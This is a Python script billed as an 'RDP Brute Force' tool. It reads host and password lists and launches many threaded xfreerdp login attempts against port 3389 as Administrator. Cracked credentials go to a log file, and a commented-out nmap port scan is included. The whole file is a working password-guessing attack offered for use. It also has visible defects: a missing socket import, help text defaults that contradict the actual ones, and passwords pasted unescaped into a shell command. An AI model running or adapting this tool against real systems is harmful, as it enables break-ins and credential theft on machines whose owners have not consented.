import os
import sys
import time
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_network
import nmap
from queue import Queue
from collections import defaultdict
from threading import Event


def parse_args():
    parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
    parser.add_argument('--username', type=str, default='Administrator', help='username for RDP login (default: Administrator)')
    parser.add_argument('--password-file', type=str, required=True, help='path to file containing password list')
    parser.add_argument('--delay', type=int, default=0, help='delay between attempts in seconds (default: 5)')
    parser.add_argument('--max-attempts', type=int, default=1, help='maximum number of attempts (default: 5)')
    parser.add_argument('--threads', type=int, default=40, help='number of threads to use for brute forcing (default: 5)')
    return parser.parse_args()

def print_banner():
    banner = '''
                                   Okan YILDIZ RDP Brute Force
'''
    print(banner)

def check_rdp_access(ip, rdp_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, rdp_port))
        if result == 0:
            return True
        else:
            return False
        sock.close()
    except Exception as e:
        print(f"Error: {e}")
        return False

def brute_force(ip, username, rdp_port, max_attempts, password_queue, stop_event):
    while not password_queue.empty() and not stop_event.is_set():
        password = password_queue.get()
        attempts = 0
        while attempts < max_attempts and not stop_event.is_set():
            cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
            result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                print(f'[SUCCESS] IP: {ip} | Password: {password}')
                with open("successful_logins.txt", "a") as log:
                    log.write(f"{ip},{username},{password}\n")
                stop_event.set()
                return
            else:
                print(f'[FAILED] IP: {ip} | Password: {password}')
            attempts += 1
  

# def scan_rdp_ports(ip):
#     try:
#         nm = nmap.PortScanner()
#         nm.scan(hosts=ip, arguments='-p 3389 -Pn -sT -T4')
#         if ip in nm.all_hosts():
#             tcp_info = nm[ip].get('tcp', {})
#             port_info = tcp_info.get(3389, {})
#             state = port_info.get('state')
#             print(f"Scan result for {ip}: port 3389 is {state}")
#             if state == 'open':
#                 return True
#         return False
#     except Exception as e:
#         print(f"Error scanning {ip}: {e}")
#         return False



def main():
    print_banner()
    args = parse_args()
    passwords = open(args.password_file, 'r').read().splitlines()
    executor = ThreadPoolExecutor(max_workers=args.threads)

    with open("open_rdp_hosts.txt", "r") as f:
        ip_list = f.read().splitlines()
        for ip in ip_list:
            print(f"[+] Launching attack on {ip}")
            password_queue = Queue()
            for password in passwords:
                password_queue.put(password)

            stop_event = Event()  # flag for successful login per IP

            for _ in range(args.threads):
                executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue, stop_event)

    time.sleep(args.delay)


if __name__ == '__main__':
    main()
